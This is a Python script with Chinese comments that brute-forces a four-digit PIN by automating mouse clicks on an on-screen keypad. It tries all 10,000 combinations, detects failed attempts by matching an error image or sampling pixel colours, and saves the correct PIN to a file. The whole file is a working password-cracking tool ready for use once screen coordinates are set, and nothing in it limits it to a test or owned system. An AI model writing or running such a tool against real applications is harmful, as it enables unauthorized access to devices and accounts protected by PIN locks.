import pyautogui
import time
import logging
from datetime import datetime
import os

# ---------- 配置区域（请根据实际坐标修改）----------
# 假设屏幕分辨率为1920x1080，且应用窗口位于屏幕中央（未缩放）
# 坐标测量方法见下文

# 数字键盘坐标（像素中心点）—— 请替换为你测得的实际值
NUM_COORDS = {
    '1': (476, 674),
    '2': (544, 679),
    '3': (614, 673),
    '4': (478, 729),
    '5': (542, 725),
    '6': (606, 729),
    '7': (477, 783),
    '8': (545, 780),
    '9': (616, 783),
    '0': (543, 837),
}

# 清除按钮坐标
CLEAR_COORD = (480, 895)   # 请替换

# 错误检测区域（用于检测“密码错误”文字出现的区域）
# 方法1：使用图像匹配（推荐），只需提供错误提示的模板图片
ERROR_TEMPLATE = "./templates/error_msg.png"   # 如果不想用图像匹配，可改为像素检测
USE_IMAGE_DETECTION = True   # True：用图像匹配；False：用固定区域像素颜色检测

# 如果使用像素检测，定义错误提示区域（左上角坐标和宽高）
ERROR_REGION = (400, 200, 200, 50)   # 请根据实际界面调整
# 错误时该区域的平均RGB值（需要预先采样），例如红色背景
ERROR_RGB_THRESHOLD = (200, 50, 50)   # (R, G, B) 阈值，实际检测时比较平均色差

# 其他参数
WAIT_AFTER_SUBMIT = 0.9          # 输入完后等待校验
CLICK_INTERVAL = 0.1             # 点击间隔
LOG_FILE = "bruteforce_log.txt"

# 设置PyAutoGUI全局暂停
pyautogui.PAUSE = 0.05

# 如果屏幕有缩放，启用DPI感知（Windows）
try:
    import ctypes
    ctypes.windll.user32.SetProcessDPIAware()
except:
    pass

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler()
    ]
)

# ---------- 核心函数 ----------

def click_at(coord, wait=CLICK_INTERVAL):
    """点击指定坐标"""
    pyautogui.click(coord[0], coord[1])
    time.sleep(wait)

def clear_input():
    """点击清除按钮"""
    click_at(CLEAR_COORD)
    logging.debug("已点击清除")

def input_password(password):
    """按顺序点击数字"""
    for digit in password:
        coord = NUM_COORDS.get(digit)
        if coord is None:
            logging.error(f"未知数字: {digit}")
            return False
        click_at(coord)
    return True

def is_error_detected():
    """
    检测是否出现错误提示
    返回 True 表示错误存在，False 表示无错误（可能成功）
    """
    if USE_IMAGE_DETECTION:
        # 使用图像匹配（需准备模板图片）
        try:
            pos = pyautogui.locateOnScreen(
                ERROR_TEMPLATE,
                confidence=0.85,
                # 可以限定搜索区域加快速度，例如：
                # region=(300, 150, 500, 200)
            )
            return pos is not None
        except Exception as e:
            logging.error(f"图像检测出错: {e}")
            return True   # 出错时假设错误，避免误判成功
    else:
        # 使用像素颜色检测
        try:
            # 截取固定区域
            screenshot = pyautogui.screenshot(region=ERROR_REGION)
            # 计算平均RGB
            avg_color = screenshot.resize((1, 1)).getpixel((0, 0))
            # 判断是否接近错误颜色（例如红色）
            r, g, b = avg_color
            # 简单阈值：如果红色分量显著高于绿色和蓝色，认为是错误
            if r > 150 and g < 100 and b < 100:
                return True
            else:
                return False
        except Exception as e:
            logging.error(f"像素检测出错: {e}")
            return True

def record_correct_password(password):
    with open("correct_password.txt", "w") as f:
        f.write(f"正确密码: {password}\n发现时间: {datetime.now()}\n")
    logging.info(f"🎉 成功找到正确密码: {password}")

def main():
    # 简单检查（如果使用图像检测，确保模板存在）
    if USE_IMAGE_DETECTION and not os.path.exists(ERROR_TEMPLATE):
        logging.warning(f"错误模板图片 {ERROR_TEMPLATE} 不存在，将使用像素检测备用。")
        # 这里可改成自动切换，但为简单起见，直接退出
        logging.error("请准备错误模板图片或设置 USE_IMAGE_DETECTION=False")
        return

    total = 10000
    start_time = time.time()

    for pin in range(total):
        password = f"{pin:04d}"
        logging.info(f"尝试: {password} ({pin+1}/{total})")

        # 1. 清除
        clear_input()

        # 2. 输入密码
        if not input_password(password):
            logging.error("输入失败，跳过")
            continue

        # 3. 等待校验
        time.sleep(WAIT_AFTER_SUBMIT)

        # 4. 检测错误
        if not is_error_detected():
            # 未检测到错误，可能成功，再确认一次（防止延时）
            time.sleep(0.5)
            if not is_error_detected():
                record_correct_password(password)
                logging.info("脚本完成。")
                return
        # 否则继续

        # 每100次记录进度
        if (pin + 1) % 100 == 0:
            elapsed = time.time() - start_time
            avg = elapsed / (pin + 1)
            remaining = (total - pin - 1) * avg
            logging.info(f"进度: {pin+1}/{total}, 耗时 {elapsed//60:.0f}分 {elapsed%60:.0f}秒, 预计剩余 {remaining//60:.0f}分")

    logging.warning("遍历完毕，未找到正确密码。")

if __name__ == "__main__":
    print("即将开始，请确保目标窗口在最前。")
    print("5秒后开始...")
    time.sleep(5)
    main()